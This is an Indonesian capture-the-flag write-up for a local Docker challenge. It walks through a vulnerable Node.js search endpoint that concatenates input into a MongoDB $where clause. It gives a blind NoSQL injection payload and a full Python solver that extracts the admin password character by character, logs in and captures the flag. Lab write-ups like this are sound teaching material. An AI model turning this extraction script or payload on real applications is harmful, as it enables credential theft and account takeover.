# WriteUp: Polisi Rahasia 2

## Overview

* **Judul:** Polisi Rahasia 2
* **Kategori:** Input Injection (Blind NoSQL Injection)
* **Poin:** 1000
* **Deskripsi:** Bisa ngga masuk ke aplikasi internal polisi rahasia Ostania meski lu ngga tau credential-nya?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `ostania2.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia 2]
└─$ tree
.
├── ostania2.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`ostania2.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/ostania-sss2:latest
    ports:
      - "1337:3000"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia 2]
└─$ PWN=WanZKey docker compose -f ostania2.yml up -d --build

```

### 2. Source Code Analysis (White Box)

Berdasarkan inspeksi source code (via `docker exec`), ditemukan perbedaan signifikan dibanding versi sebelumnya.

**Patch pada Login (`app.js`):**

```javascript
app.post('/login', (req, res) => {
    // AMAN: Menggunakan Object Query, bukan concatenation string.
    User.findOne({ username: username, password: password })
        .then(user => { ... })
});

```

Login tidak lagi rentan terhadap *authentication bypass* sederhana. Kita harus mencari cara untuk mendapatkan password asli admin.

**Vulnerability Baru pada Search (`app.js`):**

```javascript
app.get('/search', (req, res) => {
    const { q } = req.query;

    if (q !== undefined && q !== '') {
        // VULNERABLE: Input Concatenation di dalam $where
        const whereClause = `this.username == "${q}"`;

        User.find({ $where: whereClause })
            // ...
    }
});

```

**The Oracle (Indikator Boolean):**
Pada file `views/search.ejs`, terdapat logika tampilan:

```html
<% if (results && results.length > 0) { %>
    <% } else { %>
    <div class="no-results">No operatives found matching your query.</div>
<% } %>

```

Jika query database mengembalikan hasil (TRUE), tulisan "No operatives found" **tidak ada**.
Jika query database kosong (FALSE), tulisan "No operatives found" **muncul**.

### 3. Exploitation Strategy (Blind NoSQL Injection)

Karena kita tidak bisa melihat data password secara langsung di hasil pencarian, kita melakukan serangan **Blind Injection** untuk menebak password karakter demi karakter (Data Exfiltration).

**Payload Logic:**
Kita memanipulasi parameter `q` agar query menjadi:
`this.username == "admin" && this.password.startsWith("TEBAKAN") && "1" == "1"`

**Payload:**
`admin" && this.password.startsWith("TEBAKAN") && "1`

**Flow Serangan:**

1. Inject payload ke endpoint `/search`.
2. Cek response body.
3. Jika **TIDAK ADA** string "No operatives found", berarti tebakan karakter password BENAR (karena `User.find` berhasil menemukan admin).
4. Jika **ADA** string "No operatives found", berarti tebakan SALAH.
5. Ulangi proses sampai seluruh password terekstrasi.
6. Login ke `/login` menggunakan password yang didapat untuk mengambil flag.

## Script Solver

Script Python untuk melakukan eksploitasi Blind NoSQL Injection, mengekstrak password, dan login otomatis.

**File:** `exploit.py`

```python
import requests
import string
import sys
import time

# Target URL
BASE_URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {BASE_URL}")
    print("[*] Vulnerability: Blind NoSQL Injection via /search")
    
    # Charset password (huruf, angka, simbol umum flag)
    # Kita taruh '}' di akhir biar gak exit duluan
    charset = string.ascii_letters + string.digits + "{}_-!@#$%"
    
    password = ""
    print("[*] Starting password exfiltration for user 'admin'...")
    
    while True:
        found_char = False
        
        for char in charset:
            # Payload: admin" && this.password.startsWith("...a") && "1
            test_password = password + char
            payload = f'admin" && this.password.startsWith("{test_password}") && "1'
            
            params = {'q': payload}
            
            try:
                r = requests.get(f"{BASE_URL}/search", params=params)
                
                # LOGIC FIX:
                # Kita cek negative response.
                # Di search.ejs: <div class="no-results">No operatives found matching your query.</div>
                # Kalau password BENAR -> Admin muncul -> Tulisan "No operatives found" HILANG.
                # Kalau password SALAH -> Admin gak muncul -> Tulisan "No operatives found" MUNCUL.
                
                if "No operatives found" not in r.text:
                    password += char
                    sys.stdout.write(f"\r[+] Password found so far: {password}")
                    sys.stdout.flush()
                    found_char = True
                    break
                    
            except Exception as e:
                pass

        if not found_char:
            print(f"\n\n[+] Full Password Extracted: {password}")
            login_and_get_flag(password)
            break

def login_and_get_flag(password):
    print("\n[*] Login sebagai Admin...")
    s = requests.Session()
    
    # Login
    login_data = {
        'username': 'admin',
        'password': password
    }
    
    r = s.post(f"{BASE_URL}/login", data=login_data)
    
    if "Dashboard" in r.text or r.url.endswith("/dashboard"):
        print("[+] Login Sukses! Mengambil Flag...")
        
        # Cek dashboard
        if "flag" not in r.text:
            r = s.get(f"{BASE_URL}/dashboard")
            
        import re
        flag = re.search(r'pwn\{.*?\}', r.text)
        if flag:
            print("-" * 50)
            print(f"[!!!] JACKPOT! FLAG: {flag.group(0)}")
            print("-" * 50)
        else:
            print("[-] Login sukses tapi flag tidak ditemukan di dashboard.")
    else:
        print("[-] Login Gagal. Password mungkin salah atau ada isu session.")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Input Injection/Polisi Rahasia 2]
└─$ ./exploit.py
[*] Target: http://localhost:1337
[*] Vulnerability: Blind NoSQL Injection via /search
[*] Starting password exfiltration for user 'admin'...
[+] Password found so far: gzimfjre6kasnupd

[+] Full Password Extracted: gzimfjre6kasnupd

[*] Login sebagai Admin...
[+] Login Sukses! Mengambil Flag...
--------------------------------------------------
[!!!] JACKPOT! FLAG: pwn{14002f080b8ed8ea55ae8a251b79d9bb}
--------------------------------------------------

```

## Flag

```
pwn{14002f080b8ed8ea55ae8a251b79d9bb}

```
